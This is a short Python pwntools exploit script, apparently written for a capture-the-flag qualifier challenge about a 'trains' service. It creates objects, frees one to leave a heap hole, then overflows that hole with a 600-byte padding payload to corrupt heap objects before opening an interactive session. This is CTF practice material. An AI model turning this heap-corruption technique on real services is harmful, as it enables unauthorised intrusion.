from pwn import *

# exit(0)
# s = remote("awsno_cfeaa78b474521963ccfd450cd938ce9.quals.shallweplayaga.me", 80)
HOST="127.0.0.1"

p = remote(HOST, 9345)
prevl = p.level
p.level = 'debug'

head = "GET /trains HTTP/1.1\nContent-Type: text/html\n\n\n"
p.send(head+"\n\n")
print p.recv(1024)

def s(msg):
  p.send(msg)

def sl(msg):
  p.sendline(msg)

def r(msg):
  return p.recvuntil(msg)

# create 3 trains
for i in range(1,3+1):
  r(':')
  sl("1")

  r("Name:")
  sl("n%d" %i)

  r("Model:")
  sl("modelmodelmo%d" %i)

  r("Type:")
  sl("typetypetype%d" %i)

  r("Speed:")
  sl("0")

  r("Passengers:")
  sl("0")

print "=== OKAY ==="
#create a hole where the 2nd name was

r(":")
sl("4")

r("(y/n):")
sl("n")

r("index:")
sl("2")

r("(y/n):")
sl("y")

r(":")
sl("x2") #this frees the old name, which will then be used as input we can smash from since it was ~32 in size. 

r(":")
sl("7")
r('Enter Index')
#s.send("1234\x00" + "A"*10   +"\n")  
s("1234" + "\x00" + "A" * 600 +"\n") #this smashes into our hole, overwriting ada objects on the heap

r('Enter Index')
sl("0")   # last index

r(":")
sl("2")   #  trigger a print

#print s.recv(1024)
p.level = prevl
p.interactive() #lets see if we survived

p.close()
